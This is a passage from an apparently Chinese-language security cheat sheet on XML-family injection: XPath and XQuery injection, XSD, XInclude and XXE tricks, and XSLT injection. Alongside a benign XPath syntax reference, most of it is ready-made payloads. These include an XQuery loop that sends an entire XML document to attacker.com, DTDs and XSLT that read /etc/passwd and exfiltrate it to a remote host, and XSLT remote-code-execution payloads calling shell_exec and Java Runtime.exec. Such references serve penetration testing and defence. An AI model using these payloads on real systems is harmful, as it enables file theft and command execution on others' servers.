<li><code>/root/a/text ()</code> 获取 root 节点下 a 节点的文本内容。</li>
<li><code>matches (/*[1]/name (), &#39;[A-Z]+&#39;)</code>  通过正则表达式验证。</li>
<li><code>string-to-codepoints (&quot;abc&quot;)</code> 将字符串转换为 Ascii 码 (97, 98, 99)。</li>
<li><code>(if 1 then 1 else 0)</code> 条件表达式，可用于布尔盲注。</li>
<li><code>concat (&#39;a&#39;, &#39;b&#39;)</code> 字符串链接。</li>
<li><code>doc (‘http://attacker.com/a.xml’)</code> 从 web 服务器上读取一个 xml 文档，XPath 2.0 加入。此功能不是默认启用，并且 URI 若不是 xml 文档会报错。</li>
<li><code>encode-foruri (&#39;abc&#39;)</code> URL 编码，XPath 2.0 加入。</li>
</ul>
<h3 id="XPath- 语法速查"><a href="#XPath- 语法速查" class="headerlink" title="XPath 语法速查"></a>XPath 语法速查 </h3><p> 更多 XPath 知识，参考 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/xpath/index.asp">w3school</a>。</p>
<h4 id="节点类型"><a href="# 节点类型" class="headerlink" title="节点类型"></a>节点类型</h4><p>XPath 中将 XML 节点分为以下几种类型：</p>
<ul>
<li><code>element</code> 元素 / 节点</li>
<li><code>attribute</code> 属性</li>
<li><code>text</code> 文本</li>
<li><code>namespace</code> 命名空间</li>
<li><code>processing-instruction</code> 处理指令</li>
<li><code>comment</code> 注释</li>
<li><code>root</code> 根节点</li>
</ul>
<h4 id="表达式"><a href="# 表达式" class="headerlink" title="表达式"></a>表达式</h4><p>XPath 通过表达式选取 XML 节点，常用表达式如下：</p>
<ul>
<li><code>nodename</code> 选取此节点的所有子节点</li>
<li><code>/</code> 从根节点选取</li>
<li><code>//</code> 从匹配选择的当前节点选择文档中的节点，不考虑它们的位置</li>
<li><code>.</code> 选取当前节点</li>
<li><code>..</code> 选取当前节点的父节点</li>
<li><code>@</code> 选取属性</li>
</ul>
<p>例如：</p>
<ul>
<li><code>bookstore</code> 选取 bookstore 元素所有的子节点</li>
<li><code>/bookstore</code> 选取根节点 bookstore</li>
<li><code>bookstore/book</code> 选取 bookstore 节点下所有子节点中的 book 节点</li>
<li><code>//book</code> 选取所有的 book 节点，不论在文档中的位置在哪</li>
<li><code>bookstore//book</code> 选取 bookstore 节点中所有后代节点中的 book 节点</li>
<li><code>//@lang</code> 选取名为 lang 的所有属性</li>
</ul>
<h4 id="限定语"><a href="# 限定语" class="headerlink" title="限定语"></a>限定语 </h4><p> 通过限定语可以选取某个具体的节点，限定语跟在节点后，包裹在方括号中，例如：</p>
<ul>
<li><code>/bookstore/book [1]</code> 选取属于 bookstore 子节点中的第一个 book 节点</li>
<li><code>/bookstore/book [last ()]</code> 选取属于 bookstore 子节点中的最后一个 book 节点</li>
<li><code>//title [@lang]</code> 选取所有拥有名为 lang 的属性的 title 节点</li>
<li><code>//title [@lang=&#39;eng&#39;]</code> 选取所有 title 节点，且这些节点拥有值为 eng 的 lang 属性</li>
<li><code>/bookstore/book [price&gt;3.500]/title</code> 选取 bookstore 节点中的 book 节点的所有 title 节点，且其中的 price 节点的值须大于 35.00</li>
</ul>
<h4 id="通配符"><a href="# 通配符" class="headerlink" title="通配符"></a>通配符</h4><p>XPath 支持部分通配符选择元素：</p>
<ul>
<li><code>*</code> 匹配任意节点</li>
<li><code>@*</code> 匹配任意属性节点</li>
</ul>
<p>例如：</p>
<ul>
<li><code>/bookstore/*</code> 选择 bookstore 节点下的所有子节点</li>
<li><code>//*</code> 选择文档中所有节点</li>
<li><code>//title [@*]</code> 选择所有带有属性的节点</li>
</ul>
<h4 id="多路径查询"><a href="# 多路径查询" class="headerlink" title="多路径查询"></a>多路径查询</h4><p>XPath 支持使用 <code>|</code> 进行多路径查询，例如：</p>
<ul>
<li><code>//book/title | //book/price</code> 选择 book 节点下的所有 title 和 price 节点</li>
<li><code>bookstore/book/title | //price</code> 选择属于 bookstore 节点的 book 节点下的所有 title 节点以及文档中所有 price 节点</li>
</ul>
<h2 id="XQuery- 注入"><a href="#XQuery- 注入" class="headerlink" title="XQuery 注入"></a>XQuery 注入</h2><p>XQuery 是 XPath 的超集，XQuery 可以赋予 XPath 逻辑编程能力，例如下面的代码会遍历每一个从 <code>users</code> 中查询出的节点，并且返回该节点下的 <code>username</code> 节点。</p>
<figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">$user</span> <span class="keyword">in</span> //users [@role=<span class="string">&#x27;admin&#x27;</span>] <span class="keyword">return</span> <span class="variable">$user</span>/username</span><br></pre></td></tr></table></figure>

<p>若上述查询中，<code>admin</code> 字符串可控，那么就可以注入 XPath 查询甚至 XQuery 代码，下面的代码利用 <code>doc</code>，循环便利整个 xml 文档，将所有整个文档发送到攻击者的服务器中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> $n <span class="keyword">in</span> /*[<span class="number">1</span>]/*</span><br><span class="line">    let $x := <span class="keyword">for</span> $att <span class="keyword">in</span> $n/@* <span class="keyword">return</span>(concat (name ($att), <span class="string">&quot;=&quot;</span>, encode-<span class="keyword">for</span>-uri ($att)))</span><br><span class="line">    let $y := doc (concat (</span><br><span class="line">        <span class="string">&quot;http://attacker.com/?name=&quot;</span>, encode-<span class="keyword">for</span>-uri (name ($n)), </span><br><span class="line">        <span class="string">&quot;&amp;amp;data=&quot;</span>, encode-<span class="keyword">for</span>-uri ($n/text ()),</span><br><span class="line">        <span class="string">&quot;&amp;amp;attr_&quot;</span>, string-join ($x,<span class="string">&quot;&amp;amp;attr_&quot;</span>)</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> $c <span class="keyword">in</span> $n/child::*</span><br><span class="line">        let $x := <span class="keyword">for</span> $att <span class="keyword">in</span> $c/@* <span class="keyword">return</span>(concat (name ($c), <span class="string">&quot;=&quot;</span>, encode-<span class="keyword">for</span>-uri ($c)))</span><br><span class="line">        let $y := doc (concat (</span><br><span class="line">            <span class="string">&quot;http://attacker.com/?child=1&amp;amp;name=&quot;</span>, encode-<span class="keyword">for</span>-uri (name ($c)),</span><br><span class="line">            <span class="string">&quot;&amp;amp;data=&quot;</span>, encode-<span class="keyword">for</span>-uri ($c/text ()),</span><br><span class="line">            <span class="string">&quot;&amp;amp;attr_&quot;</span>, string-join ($x,<span class="string">&quot;&amp;amp;attr_&quot;</span>)</span><br><span class="line">        )) </span><br></pre></td></tr></table></figure>

<p>Exist-DB 是一个类似 SQLite 的本地 xml 数据库，可以通过 XQuery 进行查询。不同于其他数据库，Exist-DB 使用 HTTP 接口进行查询，例如 REST, XML-RPC, WebDAV 和 SOAP。更多 XQuery 知识，参考 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/xquery/index.asp">w3school</a></p>
<h2 id="XSD- 注入"><a href="#XSD- 注入" class="headerlink" title="XSD 注入"></a>XSD 注入</h2><p>XSD (XML Schema Definition) 是一种用来描述 XML 文档元素的定义方法，可以用来代替 DTD，比 DTD 更加强大，功能也更多。更多 XSD 知识，请参考 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/schema/index.asp">w3school</a></p>
<h3 id="XSD-schemaLocation"><a href="#XSD-schemaLocation" class="headerlink" title="XSD schemaLocation"></a>XSD schemaLocation</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    % remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ttt:data</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:ttt</span>=<span class="string">&quot;http://attacker.com/attack&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;ttt http://attacker.com/<span class="symbol">&amp;internal;</span>&quot;</span>&gt;</span>4<span class="tag">&lt;/<span class="name">ttt:data</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>evil.dtd</code> 中的内容为：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> “file:///etc/passwd”&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> “&lt;!ENTITY <span class="keyword">internal</span> ‘% payload;’&gt;</span>”&gt;</span><br><span class="line">% param1;</span><br></pre></td></tr></table></figure>

<h3 id="XSD-noNamespaceSchemaLocation"><a href="#XSD-noNamespaceSchemaLocation" class="headerlink" title="XSD noNamespaceSchemaLocation"></a>XSD noNamespaceSchemaLocation</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    % remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">”http://www.w3.org/2001/XMLSchema-instance”</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:noNamespaceSchemaLocation</span>=<span class="string">”http://attacker.com/&amp;internal;”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>evil.dtd</code> 中的内容为：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> “file:///etc/passwd”&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> “&lt;!ENTITY <span class="keyword">internal</span> ‘% payload;’&gt;</span>”&gt;</span><br><span class="line">% param1;</span><br></pre></td></tr></table></figure>

<h3 id="XSD-Include-import"><a href="#XSD-Include-import" class="headerlink" title="XSD Include/import"></a>XSD Include/import</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:schema</span> <span class="attr">elementFormDefault</span>=<span class="string">&quot;qualified&quot;</span> <span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:myNS</span>=<span class="string">&quot;myNS&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:import</span> <span class="attr">namespace</span>=<span class="string">&quot;myNS&quot;</span> <span class="attr">schemaLocation</span>=<span class="string">&quot;http://attacker.com/evil.xsd&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:include</span> <span class="attr">namespace</span>=<span class="string">&quot;myNS2&quot;</span> <span class="attr">schemaLocation</span>=<span class="string">&quot;http://attacker.com/evil.xsd&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:schema</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><blockquote>
<p>XInclude 需要手动开启。</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    % remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xi</span>=<span class="string">”http://www.w3.org/2001/XInclude”</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">”http://attacker.com/&amp;internal;”</span> <span class="attr">parse</span>=<span class="string">”text”</span>&gt;</span><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>evil.dtd</code> 中的内容为：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> “file:///etc/passwd”&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> “&lt;!ENTITY <span class="keyword">internal</span> ‘% payload;’&gt;</span>”&gt;</span><br><span class="line">% param1;</span><br></pre></td></tr></table></figure>

<h3 id="XSD- 报错"><a href="#XSD- 报错" class="headerlink" title="XSD 报错"></a>XSD 报错</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:restriction</span> <span class="attr">base</span>=<span class="string">&quot;xs:string&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:pattern</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;xxe;</span>&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:restriction</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="XSLT- 注入"><a href="#XSLT- 注入" class="headerlink" title="XSLT 注入"></a>XSLT 注入</h2><p>XSLT (EXtensible Stylesheet Language Transform)，是一种扩展样式表转换语言，可以将 XML 转换为其他类型的语言。更多 XSLT 知识，请参考 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/xsl/index.asp">w3school</a>。</p>
<h3 id="获取 -XSLT- 信息"><a href="# 获取 -XSLT- 信息" class="headerlink" title="获取 XSLT 信息"></a>获取 XSLT 信息</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    XSLT Version: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;system-property (&#x27;xsl:version&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">    XSLT Vendor: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;system-property (&#x27;xsl:vendor&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">    XSLT Vendor URL: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;system-property (&#x27;xsl:version-url&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XSLT-Stylesheet"><a href="#XSLT-Stylesheet" class="headerlink" title="XSLT Stylesheet"></a>XSLT Stylesheet</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;http://attacker.com/evil.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">doc</span>&gt;</span><span class="tag">&lt;/<span class="name">doc</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XSLT-Include-import"><a href="#XSLT-Include-import" class="headerlink" title="XSLT Include/import"></a>XSLT Include/import</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:import</span> <span class="attr">href</span>=<span class="string">&quot;http://attacker.com/evil.xsl&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">&quot;http://attacker.com/evil.xsl&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XSLT- 读取文件"><a href="#XSLT- 读取文件" class="headerlink" title="XSLT 读取文件"></a>XSLT 读取文件 </h3><p> 可读取合法的 xml 文件，或者普通文件的第一行</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;document (&#x27;test.xml&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;document (&#x27;file:///secret.txt&#x27;)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>将读取到的文件发送到远程服务器中：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;name1&quot;</span> <span class="attr">select</span>=<span class="string">&quot;document (&#x27;file:///etc/passwd&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;name2&quot;</span> <span class="attr">select</span>=<span class="string">&quot;concat (&#x27;http://attacker.com/?&#x27;, $name1)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;name3&quot;</span> <span class="attr">select</span>=<span class="string">&quot;document ($name2)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XSLT-RCE"><a href="#XSLT-RCE" class="headerlink" title="XSLT RCE"></a>XSLT RCE</h3><p>libxslt + php 环境：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:php</span>=<span class="string">&quot;http://php.net/xsl&quot;</span>&gt;</span></span><br><span class="line">          </span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:output</span> <span class="attr">method</span>=<span class="string">&quot;html&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;php:function (&#x27;shell_exec&#x27;, &#x27;sleep 10&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Xalan-Java 环境：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line">xmlns:runtime=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;</span><br><span class="line">xmlns:process=&quot;http://xml.apache.org/xalan/java/java.lang.Process&quot;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;rtobject&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:getRuntime ()&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;process&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:exec ($rtobject, &#x27;sleep 5&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;waiting&quot;</span> <span class="attr">select</span>=<span class="string">&quot;process:waitFor ($process)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$process&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;osversion&quot;</span> <span class="attr">select</span>=<span class="string">&quot;jv:java.lang.System.getProperty (&#x27;oname&#x27;)&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$osversion&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>Xalan 环境：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:jv</span>=<span class="string">&quot;http://xml.apache.org/xalan/java&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">exclude-result-prefixes</span>=<span class="string">&quot;jv&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;osversion&quot;</span> <span class="attr">select</span>=<span class="string">&quot;jv:java.lang.System.getProperty (&#x27;os.name&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$osversion&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Saxon EE 环境：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:date</span>=<span class="string">&quot;java:java.util.Date&quot;</span> <span class="attr">xmlns:runtime</span>=<span class="string">&quot;java:java.lang.Runtime&quot;</span> <span class="attr">xmlns:process</span>=<span class="string">&quot;java:java.lang.Process&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    